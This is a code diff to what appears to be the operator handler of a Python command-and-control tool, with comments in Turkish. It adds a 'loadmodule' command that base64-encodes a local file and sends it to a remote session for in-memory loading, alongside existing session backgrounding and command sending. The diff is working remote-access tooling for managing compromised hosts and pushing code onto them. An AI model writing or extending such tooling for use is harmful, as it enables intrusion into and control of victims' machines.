@@ -9,16 +9,10 @@ import socket
 import threading
 import struct
 import time
-from rich import print
-from core.handler import BaseHandler
-from core.shared_state import shared_state
-import socket
-import threading
-import struct
-import time
 import ssl
 import os
 import subprocess
+import base64
 from rich import print
 from typing import Dict, Any, Tuple
 
@@ -186,6 +180,36 @@ class Handler(BaseHandler):
                     # Arka plana at (Session açık kalır)
                     print(f"[*] Session {self.session_id} arka plana atıldı.")
                     break
+
+                # Özellik 2.1: Modül Yükleme (Local File -> Remote Memory)
+                if cmd.startswith("loadmodule "):
+                    try:
+                        parts = cmd.split(" ", 1)
+                        if len(parts) < 2:
+                            print("[!] Kullanım: loadmodule <local_file_path>")
+                            continue
+                        
+                        file_path = parts[1].strip()
+                        if not os.path.exists(file_path):
+                            print(f"[!] Dosya bulunamadı: {file_path}")
+                            continue
+                        
+                        # Dosyayı oku ve encode et
+                        with open(file_path, "rb") as f:
+                            file_content = f.read()
+                            b64_content = base64.b64encode(file_content).decode('utf-8')
+                        
+                        # Dosya adından modül adı türet (uzantısız)
+                        filename = os.path.basename(file_path)
+                        module_name = os.path.splitext(filename)[0]
+                        
+                        # Yeni komutu hazırla
+                        print(f"[*] Modül gönderiliyor: {module_name} ({len(file_content)} bytes)")
+                        cmd = f"loadmodule {module_name} {b64_content}"
+                        
+                    except Exception as e:
+                        print(f"[!] Modül hazırlama hatası: {str(e)}")
+                        continue
 
                 # Komutu gönder
                 self.send_data(cmd)
